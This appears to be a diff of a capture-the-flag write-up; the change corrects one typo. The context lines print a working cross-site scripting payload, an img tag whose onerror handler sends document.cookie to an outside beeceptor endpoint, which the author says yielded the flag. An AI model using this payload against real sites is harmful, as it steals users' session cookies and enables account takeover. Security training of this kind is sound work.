@@ -12,7 +12,7 @@ This can get very tricky as i found out last year however the first thing I chec
 Using an img tag with an onerror that executes javascript is another very common way to inject javascript and this does work:<br />
 \<img src=X onerror='location.href="https://paulovh.free.beeceptor.com?"+ document.cookie'/\>
 
-This gived me the flag on the beeceptor mock api page!
+This gave me the flag on the beeceptor mock api page!
 
 When trying to go to /admin of the page you get redirected back to the same page at first.<br />
 I tried this /admin page as it is a common page on many sites but for a more reliable way of getting these kind of pages you can use:<br />
